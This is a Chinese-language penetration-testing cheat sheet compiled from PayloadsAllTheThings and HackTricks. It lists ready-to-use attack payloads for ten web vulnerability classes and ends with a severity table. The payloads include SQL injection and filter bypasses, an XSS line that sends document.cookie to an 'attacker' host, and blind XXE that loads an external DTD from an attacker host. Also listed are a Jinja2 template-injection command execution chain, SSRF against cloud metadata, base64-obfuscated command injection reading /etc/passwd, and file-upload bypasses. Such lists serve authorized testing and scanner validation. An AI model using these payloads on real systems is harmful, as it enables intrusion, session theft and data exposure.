# 漏洞扫描知识库 — 漏洞类型实战 Payload

> 用途：PayloadsAllTheThings + HackTricks 精编。10 大漏洞类型的实战检测 Payload，供漏洞扫描验证与报告建议参考。
> ⚠️ 仅供授权测试使用。

---

## 1. SQL 注入

**检测 Payload：**
```
' OR '1'='1
' OR 1=1--
1' AND SLEEP(5)--
' UNION SELECT 1,2,3--
1' ORDER BY 10--   # 测列数
```

**盲注（布尔/时间）：**
```
1 AND 1=1  → 正常
1 AND 1=2  → 异常（存在布尔盲注）
1 AND SLEEP(5) → 延迟5秒（时间盲注）
```

**报错注入：**
```
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**绕过：**
```
' oR '1'='1   # 大小写
'/**/OR/**/1=1#   # 注释符
1'||'1'='1    # 连接符
```

## 2. XSS（跨站脚本）

**反射型检测：**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```
**存储型（payload 存入数据库）：**
```html
<script>fetch('http://attacker/'+document.cookie)</script>
```
**DOM 型（无需服务器交互）：**
```
#javascript:alert(1)
<svg onload=alert(document.domain)>
```
**绕过（CSP/过滤）：**
```
<svg/onload=alert`1`>
<img src=x:alert(1)>
<a href="javascript:alert(1)">click</a>
```

## 3. SSRF（服务端请求伪造）

**常见参数：** url= / http:// / image_url= / webhook= / feed= / next=
```
url=http://127.0.0.1:6379      # 内网 Redis
url=http://169.254.169.254/    # 云元数据(获取AK/SK)
url=file:///etc/passwd          # 读本地文件
url=http://[::1]:80             # IPv6 绕过
url=http://2130706433/          # 十进制IP绕过
url=http://0x7f000001/          # 十六进制IP绕过
```

## 4. SSTI（服务端模板注入）

**探测：** 在模板参数输入算术后看回显
```
{{7*7}}   # 返回49 → Jinja2/Twig
${7*7}    # 返回49 → Freemarker/Velocity
<%= 7*7 %> # JSP
#{7*7}    # Thymeleaf
```
**Jinja2 RCE:**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

## 5. XXE（XML 外部实体）

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```
**盲 XXE（外带）：**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % ext SYSTEM "http://attacker/xxe.dtd">
%ext;
```
**SSRF via XXE：**
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

## 6. 命令注入

**常见参数：** ping= / ip= / host= / cmd=
```
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 `id`
$(cat /etc/passwd)
```
**绕过（字符过滤）：**
```
;{echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}   # base64编码命令
$(printf '\x69\x64')                          # 十六进制
```

## 7. 文件上传

**绕过扩展名：**
```
shell.php.jpg / shell.pHp / shell.php%00.png / shell.php.png
shell.php3 / shell.phtml / shell.php5
```
**绕过 Content-Type：** 改成 image/png
**绕过内容：** 图片头 GIF89a + PHP代码（图片马）

## 8. 反序列化

**常见目标：** Java(ObjectInputStream) / PHP(unserialize) / .NET(Json.NET) / Python(pickle)
```
Java: 攻击链如 CommonsCollections1/Shiro、Fastjson payload
PHP: O:8:"User":1:{s:4:"name";O:8:"System":0:{}}
Python pickle: __reduce__ 执行命令
```
**探测：** 提交序列化数据看报错或延迟（如 fastjson 报 autoType）

## 9. 路径遍历 / 文件读取

```
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2fetc/passwd
....//....//etc/passwd
file:///etc/passwd
```

## 10. 越权 / IDOR

```
user_id=1001 → 改成 1002 看是否返回他人数据
/api/users/100 → 遍历 101,102...
order_id=1234 → 访问他人订单
```

---

## 判断优先级

| 类型 | 风险 | 报告建议 |
|------|------|---------|
| SQL注入/命令注入/反序列化/XXE | 🔴 严重 | P0，参数化+输入校验 |
| SSRF/SSTI/未授权上传 | 🔴 严重/高危 | P0/P1 |
| XSS/越权/路径遍历 | 🟠 高危 | P1 |
| 配置类/信息泄露 | 🟡 中低危 | P2/P3 |
